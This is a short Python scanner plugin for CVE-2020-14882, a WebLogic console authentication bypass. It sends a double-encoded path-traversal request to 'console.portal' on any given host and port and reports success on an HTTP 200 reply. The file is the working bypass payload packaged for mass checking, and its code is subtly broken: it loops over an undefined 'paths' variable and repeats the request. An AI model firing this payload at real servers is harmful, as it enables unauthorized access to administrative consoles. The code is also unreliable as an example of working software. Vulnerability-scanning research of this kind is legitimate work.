#!/usr/bin/env python3
# _*_ coding:utf-8 _*_
# CVE-2020-14882
# updated 2020/11/27
# by 0xn0ne
import requests
from multiprocessing.managers import SyncManager
from typing import Any, Dict, List, Mapping, Tuple, Union

from stars import target_type, Star
from utils import http


# @universe.groups()
class CVE_2020_14882(Star):
    info = {
        'NAME': 'webLogic bypass authentication',
        'CVE': 'CVE-2020-14882',
        'TAG': []
    }
    type = target_type.VULNERABILITY

    def light_up(self, dip, dport, force_ssl=None, *args, **kwargs) -> (bool, dict):
        session = requests.session()
        for path in paths:
            http('http://{}:{}/console/css/%252e%252e%252fconsole.portal'.format(dip,
                dport), ssl=force_ssl, session=session)
            r, data = http('http://{}:{}/console/css/%252e%252e%252fconsole.portal'.format(
                dip, dport), ssl=force_ssl, session=session)

            if r and r.status_code == 200:
                return True, {'url': r.url}
        return False, {}


def run(queue: SyncManager.Queue, data: Dict):
    obj = CVE_2020_14882()
    result = {
        'IP': data['IP'],
        'PORT': data['PORT'],
        'NAME': obj.info['CVE'] if obj.info['CVE'] else obj.info['NAME'],
        'MSG': '',
        'STATE': False
    }
    result['STATE'], result['MSG'] = obj.light_and_msg(
        data['IP'], data['PORT'], data['IS_SSL'])

    queue.put(result)
